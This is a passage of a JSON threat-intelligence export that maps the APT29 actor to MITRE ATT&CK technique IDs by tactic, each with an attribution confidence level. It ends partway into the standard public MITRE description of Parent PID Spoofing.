"{\"threat-actors\": [{\"id\": \"threat-actor--7a39953e-0dae-569a-9d49-d52a4a8865b1\", \"name\": \"APT29\", \"type\": \"actor-mitre\", \"attack-patterns\": {\"Impact\": [{\"id\": \"attack-pattern--ac9e6b22-11bf-45d7-9181-c1cb08360931\", \"attribution_scope\": \"possible\", \"sub_techniques\": [{\"id\": \"attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292\", \"attribution_scope\": \"possible\"}]}, {\"id\": \"attack-pattern--d45a3d09-b3cf-48f4-9f0f-f521ee5cb05c\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--ff73aa03-0090-4464-83ac-f89e233c02bc\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--20fb2507-d71c-455d-9b6d-6104461cf26b\", \"attribution_scope\": \"confirmed\"}], \"Lateral Movement\": [{\"id\": \"attack-pattern--54a649ff-439a-41a4-9856-8d144a2551ba\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--4f9ca633-15c5-463c-9724-bdcd54fde541\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--2db31dcd-54da-405d-acef-b9129b816ed6\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--eb062747-2193-45de-8fa2-e62549c37ddf\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--f005e783-57d4-4837-88ad-dbe7faee1c51\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--c3c8c916-2f3c-4e71-94b2-240bdfc996f0\", \"attribution_scope\": \"confirmed\"}]}], \"Resource Development\": [{\"id\": \"attack-pattern--edadea33-549c-4ed1-9783-8f5a5853cbdf\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--34b3f738-bd64-40e5-a112-29b0542bc8bf\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--1cec9319-743b-4840-bb65-431547bce82a\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--7e3beebd-8bfe-4e7b-a892-e44ab06a75f9\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--0458aab9-ad42-4eac-9e22-706a95bafee2\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--79da0971-3147-4af6-a4f5-e8cd447cd795\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--ce0687a0-e692-4b77-964a-0784a8e54ff1\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--e7cbc1de-1f79-48ee-abfd-da1241c65a15\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--19401639-28d0-4c3c-adcc-bc2ba22f6421\", \"attribution_scope\": \"confirmed\"}]}], \"Credential Access\": [{\"id\": \"attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--edf91964-b26e-4b4a-9600-ccacd7d7df24\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--65f2d882-3f41-4d48-8a06-29af77ec9f90\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--f303a39a-6255-4b89-aecc-18c4d8ca7163\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--1ecfdab8-7d59-4c98-95d4-dc41970f57fc\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--d0b4fcdb-d67d-4ed2-99ce-788b12f8c0f4\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--dd43c543-bb85-4a6f-aa6e-160d90d06a49\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--435dfb86-2697-4867-85b5-2fef496c0517\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--8d7bd4f5-3a89-4453-9c82-2c8894d5655e\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--837f9164-50af-4ac0-8219-379d8a74cefc\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--60b508a1-6a5e-46b1-821a-9f7b78752abf\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--a93494bb-4b80-4ea1-8695-3236a49916fd\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--692074ae-bb62-4a5e-a735-02cb6bde458c\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--3fc01293-ef5e-41c6-86ce-61f10706b64a\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--f2877f7f-9a4c-4251-879f-1224e3006bee\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--3fc9b85a-2862-4363-a64d-d692e3ffbee0\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--58a3e6aa-4453-4cc8-a51f-4befe80b31a8\", \"attribution_scope\": \"suspected\"}]}, {\"id\": \"attack-pattern--f4c1826f-a322-41cd-9557-562100848c84\", \"attribution_scope\": \"confirmed\"}], \"Discovery\": [{\"id\": \"attack-pattern--3489cfc5-640f-4bb3-a103-9137b97de79f\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--15dbf668-795c-41e6-8219-f0447c0e64ce\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--2aed01ad-3df3-4410-a8cb-11ea4ded587c\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--a01bf75f-00b2-4568-a58f-565ff9bf202b\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--b6075259-dba3-44e9-87c7-e954f37ec0d5\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--4bed873f-0b7d-41d4-b93a-b6905d1f90b0\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--29be378d-262d-4e99-b00d-852d573628e6\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--e3a12395-188d-4051-9a16-ea8e14d07b88\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--72b74d71-8169-42aa-92e0-e7b04b9f5a08\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--25659dd6-ea12-45c4-97e6-381e3e4b593e\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--21875073-b0ee-49e3-9077-1e2a885359af\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--4ae4f953-fe58-4cc8-a327-33257e30a830\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--767dbf9e-df3f-45cb-8998-4903ab5f80c0\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--e3b6daca-e963-4a69-aee6-ed4fd653ad58\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--e24fcba8-2557-4442-a139-1ee2f2e784db\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--322bad5a-1c49-4d23-ab79-76d641794afa\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--e358d692-23c0-4a31-9eb6-ecc13a8d7735\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--7e150503-88e7-4861-866b-ff1ac82c4475\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1\", \"attribution_scope\": \"confirmed\"}], \"Initial Access\": [{\"id\": \"attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--9fa07bef-9c81-421e-a8e5-ad4366c5a925\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--3f18edba-28f4-4bb9-82c3-8aa60dcac5f7\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--bd369cd9-abb8-41ce-b5bb-fff23ee86c00\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--a62a8db3-f23a-4d8f-afd6-9dbc77e7813b\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--2b742742-28c3-4e1b-bab7-8350d6300fa7\", \"attribution_scope\": \"confirmed\"}]}], \"Persistence\": [{\"id\": \"attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--dca670cf-eeec-438f-8185-fd959d9ef211\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--aedfca76-3b30-4866-b2aa-0f1d7fd1e4b6\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--58af3705-8740-4c68-9329-ec015a7013c2\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--e64c62cf-9cd7-4a14-94ec-cdaac43ab44b\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--a10641f4-87b4-45a3-a906-92a149cb2c27\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--e74de37c-a829-446c-937d-56a44f0e9306\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--8a2f40cf-8325-47f9-96e4-b1ca4c7389bd\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--d456de47-a16f-4e46-8980-e67478a12dcb\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--5d0d3609-d06d-49e1-b9c9-b544e0c618cb\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--910906dd-8c0a-475a-9cc1-5e029e2fad58\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--ce4b7013-640e-48a9-b501-d0025a95f4bf\", \"attribution_scope\": \"suspected\"}]}, {\"id\": \"attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--6836813e-8ec8-4375-b459-abb388cb1a35\", \"attribution_scope\": \"suspected\"}, {\"id\": \"attack-pattern--4ab929c6-ee2d-4fb5-aab4-b14be2ed7179\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--f4c1826f-a322-41cd-9557-562100848c84\", \"attribution_scope\": \"confirmed\"}], \"Exfiltration\": [{\"id\": \"attack-pattern--c3888c54-775d-4b2f-b759-75a2ececcbfd\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--774a3188-6ba9-4dc4-879d-d54ee48a5ce9\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--40597f16-0963-4249-bf4c-ac93b7fb9807\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--86a96bf6-cf8b-411c-aaeb-8959944d64f7\", \"attribution_scope\": \"confirmed\"}]}], \"Execution\": [{\"id\": \"attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--cc3502b5-30cc-4473-ad48-42d51a6ef6d1\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--d157f9d2-d09a-4efa-bb2a-64963f94e253\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--f1951e8a-500e-4a26-8803-76d95c4554b4\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--ef67e13e-5598-4adc-bdb2-998225874fa9\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e\", \"attribution_scope\": \"confirmed\"}]}], \"Privilege Escalation\": [{\"id\": \"attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--dca670cf-eeec-438f-8185-fd959d9ef211\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--93591901-3172-4e94-abf8-6034ab26f44a\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--aedfca76-3b30-4866-b2aa-0f1d7fd1e4b6\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--58af3705-8740-4c68-9329-ec015a7013c2\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--e64c62cf-9cd7-4a14-94ec-cdaac43ab44b\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--806a49c4-970d-43f9-9acc-ac0ee11e6662\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--ebb42bbe-62d7-47d7-a55f-3b08b61d792d\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--24769ab5-14bd-4f4e-a752-cfb185da53ee\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--910906dd-8c0a-475a-9cc1-5e029e2fad58\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--ce4b7013-640e-48a9-b501-d0025a95f4bf\", \"attribution_scope\": \"suspected\"}]}, {\"id\": \"attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--6836813e-8ec8-4375-b459-abb388cb1a35\", \"attribution_scope\": \"suspected\"}, {\"id\": \"attack-pattern--4ab929c6-ee2d-4fb5-aab4-b14be2ed7179\", \"attribution_scope\": \"confirmed\"}]}], \"Defense Evasion\": [{\"id\": \"attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--b4b7458f-81f2-4d38-84be-1c5ba0167a52\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--77eae145-55db-4519-8ae5-77b0c7215d69\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--1c4e5d32-1fe9-4116-9d9d-59e3925bd6a2\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--22905430-4901-4c2a-84f6-98243cb173f8\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--cbb66055-0325-4111-aca0-40547b6ad5b0\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--f2857333-11d4-45bf-b064-2c28d8525be5\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--b83e166d-13d7-4b52-8677-dff90c548fd7\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--32901740-b42c-4fdd-bc02-345b5dc57082\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--3d333250-30e4-4a82-9edc-756c68afc529\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--93591901-3172-4e94-abf8-6034ab26f44a\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--4bed873f-0b7d-41d4-b93a-b6905d1f90b0\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--29be378d-262d-4e99-b00d-852d573628e6\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--aedfca76-3b30-4866-b2aa-0f1d7fd1e4b6\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--58af3705-8740-4c68-9329-ec015a7013c2\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--e64c62cf-9cd7-4a14-94ec-cdaac43ab44b\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--806a49c4-970d-43f9-9acc-ac0ee11e6662\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--f005e783-57d4-4837-88ad-dbe7faee1c51\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--c3c8c916-2f3c-4e71-94b2-240bdfc996f0\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--ebb42bbe-62d7-47d7-a55f-3b08b61d792d\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--24769ab5-14bd-4f4e-a752-cfb185da53ee\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--457c7820-d331-465a-915e-42f85500ccc4\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--deb98323-e13f-4b0c-8d94-175379069062\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--c2e147a9-d1a8-4074-811a-d8789202d916\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--b0533c6e-8fea-4788-874f-b799cacc4b92\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--f4c1826f-a322-41cd-9557-562100848c84\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--853c4192-4311-43e1-bfbb-b11b14911852\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--a750a9f6-0bde-4bb3-9aae-1e2786e9780c\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--47f2d673-ca62-47e9-929b-1b0be9657611\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--d63a3fb8-9452-4e9d-a60a-54be68d5998c\", \"attribution_scope\": \"confirmed\"}]}], \"Reconnaissance\": [{\"id\": \"attack-pattern--67073dde-d720-45ae-83da-b12d5e73ca3b\", \"attribution_scope\": \"possible\", \"sub_techniques\": [{\"id\": \"attack-pattern--db8f5003-3b20-48f0-9b76-123e44208120\", \"attribution_scope\": \"possible\"}]}], \"Collection\": [{\"id\": \"attack-pattern--0259baeb-9f63-4c69-bf10-eb038c390688\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--b4694861-542c-48ea-9eb1-10d356e7140a\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--d28ef391-8ed4-45dc-bc4a-2f43abf54416\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--0c4b4fda-9062-47da-98b9-ceae2dcf052a\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--53ac20cd-aca3-406e-9aa0-9fc7fdc60a5a\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--41868330-6ee2-4d0f-b743-9f2294c3c9b6\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--30973a08-aed9-4edf-8604-9084ce1b5c4f\", \"attribution_scope\": \"suspected\"}, {\"id\": \"attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--ae676644-d2d2-41b7-af7e-9bed1b55898c\", \"attribution_scope\": \"confirmed\"}], \"Command and Control\": [{\"id\": \"attack-pattern--830c9528-df21-472c-8c14-a036bf17d665\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--b8902400-e6c5-4ba2-95aa-2d35b442b118\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--bf176076-b789-408e-8cba-7275e81c0ada\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--24bfaeba-cb0d-4525-b3dc-507c77ecec41\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--b18eae87-b469-4e14-b454-b171b416bc18\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--4fe28b27-b13c-453e-a386-c2ef362a573b\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--9a60a291-8960-4387-8a4a-2ab5c18bb50b\", \"attribution_scope\": \"suspected\"}, {\"id\": \"attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--1996eef1-ced3-4d7f-bf94-33298cabbf72\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--4061e78c-1284-44b4-9116-73e4ac3912f7\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--7bd9c723-2f78-4309-82c5-47cad406572b\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--118f61a5-eb3e-4fb6-931f-2096647f4ecd\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--a782ebe2-daba-42c7-bc82-e8e9d923162d\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add\", \"attribution_scope\": \"confirmed\"}]}, \"is_publishable\": true}], \"attack-patterns\": {\"attack-pattern--93591901-3172-4e94-abf8-6034ab26f44a\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-18T18:22:41.448Z\", \"name\": \"Parent PID Spoofing\", \"attack_pattern_identifier\": \"T1134.004\", \"description\": \"Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to 